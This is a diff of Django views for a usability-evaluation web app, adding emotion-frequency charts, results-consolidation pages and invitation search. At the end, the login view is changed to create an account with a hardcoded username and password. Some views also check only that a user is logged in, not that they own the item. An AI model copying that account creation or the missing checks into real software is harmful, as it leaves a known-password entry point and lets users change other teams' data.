+                    emotion_frequency_final[2] = round(emotion_frequency[2]*100 / sum(emotion_frequency.values()),2)
+                    emotion_frequency_final[3] = round(emotion_frequency[3]*100 / sum(emotion_frequency.values()),2)
+                    emotion_frequency_final[4] = round(emotion_frequency[4]*100 / sum(emotion_frequency.values()),2)
+                    emotion_frequency_final[5] = round(emotion_frequency[5]*100 / sum(emotion_frequency.values()),2)
+                    emotion_frequency_final[6] = round(emotion_frequency[6]*100 / sum(emotion_frequency.values()),2)
+
+                    x_values = ['Anger', 'Disgust', 'Fear', 'Enjoyment','Contempt', 'Sadness', 'Surprise']
+                    y_values = [emotion_frequency_final[0], emotion_frequency_final[1], emotion_frequency_final[2], emotion_frequency_final[3], emotion_frequency_final[4], emotion_frequency_final[5], emotion_frequency_final[6]]
+                    colors = ['#A13D3D', '#649941', '#5b3986', '#FF6347','#FFCC66', '#3f6aae','#3DAFAF' ] # list of colors for each bar
+                    data = []
+                    for i in range(len(x_values)):
+                        data.append(
+                            go.Bar(
+                                x=[x_values[i]],
+                                y=[y_values[i]],
+                                marker=dict(
+                                    color=colors[i]
+                                ),
+                                name=x_values[i]
+
+                            )
+                        )
+                
+
+                    layout = go.Layout(
+                        title={
+                        'text': 'Relative frequency of facial emotions',
+                        'x': 0.5, # Center the title
+                        'y': 0.85, # set y position closer to plot
+
+                        'xanchor': 'center' # Center the title horizontally
+                    },    
+
+                        xaxis=dict(title='Emotion',  tickmode='linear', tickformat='%M'),
+                        yaxis=dict(title='Probability of Emotions (%)'),
+                        font=dict( size=11),
+                    )
+
+                    fig = go.Figure(data=data, layout=layout)
+                    div = opy.plot(fig, auto_open=False, output_type='div')
+                    smellsWithEmotion_ = []
+                    for smellsWithEmotion  in json.loads(resultsConsulidation.usabilitySmells_selected_with_emotion):
+                        smellsWithEmotion_.append(smellsWithEmotion)
+                    new_data.append(smellsWithEmotion_)
+
+                    smellsWithoutEmotion_ = []
+                    for smellsWithoutEmotion in json.loads(resultsConsulidation.usabilitySmells_selected_without_emotion):
+                        smellsWithoutEmotion_.append(smellsWithoutEmotion)
+                    new_data.append(smellsWithoutEmotion_)
+                    new_data.append(div)
+
+                    dataX.append(new_data)
+                    emotion_frequency_final.clear()
+                print(dataX)
+                video_results[video]=dataX
+
+
+ 
+        return render(request, 'projectResults.html', {'projectID':projectID, 
+                                                       'projectName':project.name,
+                                                         'video_results':video_results, 
+                                                         'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+def resultsConsolidation(request):
+    if request.user.is_authenticated:
+        try:
+            teamLeader = TeamLeader.objects.filter(user=request.user).first()
+
+        except TeamLeader.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        projects = Project.objects.filter(teamLeader=teamLeader)
+        project_TM_results = {}
+        data= []
+        project_TM_results_bool  = False   
+        for project in projects:
+            invitations = Invitations.objects.filter(project=project, accept=True)
+            videos = Video.objects.filter(project__id=project.id) 
+
+            data.append(invitations.count()) #0 total tasks with emotion done
+            data.append(videos.count()) #0 total tasks with emotion done
+            project_TM_results[project]=data
+        
+        if len(project_TM_results)!=0:
+            project_TM_results_bool = True
+        return render(request, 'resultsConsolidation.html', {'project_TM_results': project_TM_results,'project_TM_results_bool':project_TM_results_bool, 'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+def resultsConsolidation_permissions(request):
+    if request.user.is_authenticated:
+        try:
+            teamLeader = TeamLeader.objects.filter(user=request.user).first()
+
+        except TeamLeader.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        projects = Project.objects.filter(teamLeader=teamLeader)
+        project_TM_results = {}
+        data= []
+        project_TM_results_bool  = False   
+        for project in projects:
+            invitations = Invitations.objects.filter(project=project, accept=True)
+            videos = Video.objects.filter(project__id=project.id) 
+
+            data.append(invitations.count()) #0 total tasks with emotion done
+            data.append(videos.count()) #0 total tasks with emotion done
+            project_TM_results[project]=data
+        
+        if len(project_TM_results)!=0:
+            project_TM_results_bool = True
+        return render(request, 'resultsConsolidation_permissions.html', {'project_TM_results': project_TM_results,'project_TM_results_bool':project_TM_results_bool, 'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+
+
+def resultsConsolidation_usabilityTests_permissions(request, projectID):
+    if request.user.is_authenticated:
+        try:
+            teamLeader = TeamLeader.objects.filter(user=request.user).first()
+
+        except TeamLeader.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        project = Project.objects.get(id=projectID)
+        project_TM_Videos_results = {}
+        project_TM_Videos_results_bool  = False   
+        invitations = Invitations.objects.filter(project=project, accept=True)
+        videos = Video.objects.filter(project__id=projectID) 
+        print(invitations)
+        subvideo_data = []
+
+        for invitation in invitations:
+
+                for video in videos:
+                    #print("VIDEO ", video)
+                    if SubVideoTask.objects.filter(video = video).exists():
+                        subVideoTask = SubVideoTask.objects.filter(video = video)  
+                        #print(" ****** ", subVideoTask)
+                        teamMember = TeamMember.objects.get(id=invitation.teamMember.id)
+
+                        totalTasks_with_emotion = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember= teamMember).count()
+                        totalTasks_without_emotion = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember= teamMember).count()
+
+                        #totalTasks = SubVideoTask.objects.filter(video = video).count()
+                        totalTasks_done_with_emotions = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,eval_done_with_emotion=True).count()
+                        totalTasks_done_without_emotions = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,eval_done_without_emotion=True).count()
+                        
+
+                        totalTasks_done_with_emotions_Smells = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,usabilitySmells_done_with_emotion=True).count()
+                        totalTasks_done_without_emotions_Smells = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,usabilitySmells_done_without_emotion=True).count()
+                        
+                        data= []
+
+                        data.append(teamMember) #0
+                        data.append(subVideoTask) #1 
+                        data.append(totalTasks_with_emotion) #2 
+                        data.append(totalTasks_without_emotion) #3
+                        data.append(totalTasks_done_with_emotions) #4
+                        data.append(totalTasks_done_without_emotions) #5 
+                        data.append(totalTasks_done_with_emotions_Smells) #6 
+                        data.append(totalTasks_done_without_emotions_Smells) #7 
+                        data.append(video) #8
+                        if ResultsConsulidationPermission.objects.filter(video=video).exists():
+                            print("TRUEEEE -----")
+                            data.append(True) #9
+                        else:
+                            data.append(False) #9
+
+
+                        #print("DATA " ,data)
+                        subvideo_data.append(data)
+                        #print("====", subvideo_data)
+
+
+                    project_TM_Videos_results[video]=subvideo_data 
+                #print("-------- ", project_TM_Videos_results)
+      
+        #project_TM_Videos_results = {k: v for k, v in project_TM_Videos_results.items() if k in v[0]}
+        print(len(project_TM_Videos_results))
+              
+              
+        x = {}
+        for k, v in project_TM_Videos_results.items():
+            new_v = [sublist for sublist in v if k in sublist]
+            x[k] = new_v
+        print(len(project_TM_Videos_results))
+
+
+        #print(project_TM_Videos_results)
+        if len(project_TM_Videos_results)!=0:
+            project_TM_Videos_results_bool = True
+        return render(request, 'resultsConsolidation_usabilityTests_permissions.html', {'projectID':projectID, 'projectName':project.name, 'project_TM_Videos_results': x,'project_TM_Videos_results_bool':project_TM_Videos_results_bool, 'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+def allow_TM_resultsConsolidation(request, videoID):
+    if request.user.is_authenticated:
+        video = Video.objects.get(id=videoID)
+        resultsConsulidatioPermission = ResultsConsulidationPermission.objects.create(video=video, allow_permission=True)
+        resultsConsulidatioPermission.save()
+        return HttpResponseRedirect('/resultsConsolidation_usabilityTests_permissions/' + str(video.project.id))
+    return redirect('login')
+
+def not_allow_TM_resultsConsolidation(request, videoID):
+    if request.user.is_authenticated:
+        video = Video.objects.get(id=videoID)
+        resultsConsulidatioPermission = ResultsConsulidationPermission.objects.filter(video=video)
+        print(resultsConsulidatioPermission)
+        resultsConsulidatioPermission.delete()
+        return HttpResponseRedirect('/resultsConsolidation_usabilityTests_permissions/' + str(video.project.id))
+    return redirect('login')
+
+
+def resultsConsolidation_usabilityTests(request, projectID):
+    if request.user.is_authenticated:
+        try:
+            teamLeader = TeamLeader.objects.filter(user=request.user).first()
+
+        except TeamLeader.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        project = Project.objects.get(id=projectID)
+        project_TM_Videos_results = {}
+        project_TM_Videos_results_bool  = False   
+        invitations = Invitations.objects.filter(project=project, accept=True)
+        videos = Video.objects.filter(project__id=projectID) 
+        print(invitations)
+        subvideo_data = []
+
+        for invitation in invitations:
+
+                for video in videos:
+                    #print("VIDEO ", video)
+                    if SubVideoTask.objects.filter(video = video).exists():
+                        subVideoTask = SubVideoTask.objects.filter(video = video)  
+                        #print(" ****** ", subVideoTask)
+                        teamMember = TeamMember.objects.get(id=invitation.teamMember.id)
+
+                        totalTasks_with_emotion = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember= teamMember).count()
+                        totalTasks_without_emotion = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember= teamMember).count()
+
+                        #totalTasks = SubVideoTask.objects.filter(video = video).count()
+                        totalTasks_done_with_emotions = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,eval_done_with_emotion=True).count()
+                        totalTasks_done_without_emotions = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,eval_done_without_emotion=True).count()
+                        
+
+                        totalTasks_done_with_emotions_Smells = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,usabilitySmells_done_with_emotion=True).count()
+                        totalTasks_done_without_emotions_Smells = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask__in=subVideoTask, teamMember = teamMember,usabilitySmells_done_without_emotion=True).count()
+                        
+                        data= []
+
+                        data.append(teamMember) #0
+                        data.append(subVideoTask) #1 
+                        data.append(totalTasks_with_emotion) #2 
+                        data.append(totalTasks_without_emotion) #3
+                        data.append(totalTasks_done_with_emotions) #4
+                        data.append(totalTasks_done_without_emotions) #5 
+                        data.append(totalTasks_done_with_emotions_Smells) #6 
+                        data.append(totalTasks_done_without_emotions_Smells) #7 
+                        data.append(video) #8
+
+                        #print("DATA " ,data)
+                        subvideo_data.append(data)
+                        #print("====", subvideo_data)
+
+
+                    project_TM_Videos_results[video]=subvideo_data 
+                #print("-------- ", project_TM_Videos_results)
+      
+        #project_TM_Videos_results = {k: v for k, v in project_TM_Videos_results.items() if k in v[0]}
+        print(len(project_TM_Videos_results))
+              
+              
+        x = {}
+        for k, v in project_TM_Videos_results.items():
+            new_v = [sublist for sublist in v if k in sublist]
+            x[k] = new_v
+        print(len(project_TM_Videos_results))
+
+
+        #print(project_TM_Videos_results)
+        if len(project_TM_Videos_results)!=0:
+            project_TM_Videos_results_bool = True
+        return render(request, 'resultsConsolidation_usabilityTests.html', {'projectID':projectID, 'projectName':project.name, 'project_TM_Videos_results': x,'project_TM_Videos_results_bool':project_TM_Videos_results_bool, 'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+def resultsConsolidation_TM_evaluation(request,evalType, videoID):
+    if request.user.is_authenticated:
+
+        video = Video.objects.get(id = videoID)  
+        project = Project.objects.get(id = video.project.id)  
+        subVideoTasks = SubVideoTask.objects.filter(video = video)  
+        results = {}
+        if evalType == "CW_with_emotion":
+            for subVideoTask in subVideoTasks:
+                data = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask = subVideoTask) 
+                data = list(data) + list(ResultsConsulidation.objects.filter(subVideoTask = subVideoTask))
+                results[subVideoTask] = data
+        elif evalType == "CW_without_emotion":
+            for subVideoTask in subVideoTasks:
+                data = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask = subVideoTask)  
+                data = list(data) + list(ResultsConsulidation.objects.filter(subVideoTask = subVideoTask))
+
+                results[subVideoTask] = data
+
+        elif evalType == "Smells_with_emotion":
+            for subVideoTask in subVideoTasks:
+                data = UsabilityEval_CW_Smells_Emotion.objects.filter(subVideoTask = subVideoTask)  
+                new_data = []
+                for d in data:
+                    new_data.append(d.teamMember)
+                    new_data.append(json.loads(d.usabilitySmells_selected_with_emotion))
+                    new_data.append(d.usabilitySmells_notes_with_emotion)
+                    new_data.append(d.usabilitySmells_notes_with_emotion)
+                
+                print(" ==================== ",new_data)
+                results[subVideoTask] = new_data
+
+        elif evalType == "Smells_without_emotion":
+            for subVideoTask in subVideoTasks:
+                data = UsabilityEval_CW_Smells_without_Emotion.objects.filter(subVideoTask = subVideoTask)  
+                new_data = []
+                for d in data:
+                    new_data.append(d.teamMember)
+                    new_data.append(json.loads(d.usabilitySmells_selected_without_emotion))
+                    new_data.append(d.usabilitySmells_notes_without_emotion)
+                results[subVideoTask] = new_data
+
+        print(results)
+       
+        return render(request, 'resultsConsolidation_TM_evaluation.html', {'projectID':project.id, 'projectName':project.name, 
+                                                                           'results': results,
+                                                                           'evalType':evalType, 'projects': nav_TeamLeader_projects(request)}) 
+
+    return redirect('login')
+
+
+
 def manage_Invitations(request):
+    invitations_ = []
     if request.user.is_authenticated:
         invitations_ = []
   
         invitationsBool = False
         try:
             teamLeader = TeamLeader.objects.filter(user=request.user).first()
+        except TeamLeader.DoesNotExist:
+            print("TeamLeader.DoesNotExist")
+
+        if request.method == 'GET':
+            print("IF -------------------------")
+            form = InvitationSearchForm(request.POST)
+            print(form)
+            if form.is_valid():
+                print("IS VALID")
+                projects = Project.objects.filter(teamLeader=teamLeader)
+                for project in projects:
+                    invitations = Invitations.objects.filter(Q(project=project)
+                                                    & Q(project__name__icontains= request.GET.get('proj_name')) if request.GET.get('proj_name') else Q() 
+                                                    & Q(teamMember__user__first_name__icontains=request.GET.get('member_name')) if request.GET.get('member_name') else Q() 
+                                                    & Q(teamMember__user__email__icontains= request.GET.get('teamMemberEmail')) if request.GET.get('teamMemberEmail') else Q() 
+                                                    & Q(project__start_date__gte= request.GET.get('start_date')) if request.GET.get('start_date') else Q() 
+                                                    & Q(project__end_date__lte=request.GET.get('end_date')) if request.GET.get('end_date') else Q() 
+                                                    & Q(created_at__eq=request.GET.get('created_at')) if request.GET.get('created_at') else Q() )
+                    for invitation in invitations:
+                        invitations_.append(invitation)
+        else:
+            print("ELSE -------------------------")
+
             projects = Project.objects.filter(teamLeader=teamLeader)
             for project in projects:
                 invitations = Invitations.objects.filter(project=project)
 
                 for invitation in invitations:
                     invitations_.append(invitation)
-                invitationsBool = True
-            print(invitations_)
-        except TeamLeader.DoesNotExist:
-            print("TeamLeader.DoesNotExist")
+            
 
-        return render(request, 'manage_Invitations.html', {'invitations': invitations_, 'invitationsBool':invitationsBool,'projects': nav_TeamLeader_projects(request)}) 
+        if len(invitations_)!=0:
+            invitationsBool = True
+        print(invitations_)
+
+        return render(request, 'manage_Invitations.html', {'invitations': set(invitations_), 'invitationsBool':invitationsBool,'projects': nav_TeamLeader_projects(request)}) 
     return redirect('login')
 
 
@@ -1433,6 +2395,11 @@ def logout(request):
     return redirect('home')
 
 def login(request):
+
+    if not TeamMember.objects.filter(user__email = "x2xxx123@gmail.com"):
+        user = User.objects.create_user(username="x2xxx123", first_name="x2xxx123",last_name="x2xxx123", email="x2xxx123@gmail.com",password="@asfdsgsc2123" )
+        TeamMember.objects.create(user=user).save()
+
     if request.user.is_authenticated:
         return redirect('home')
     else:
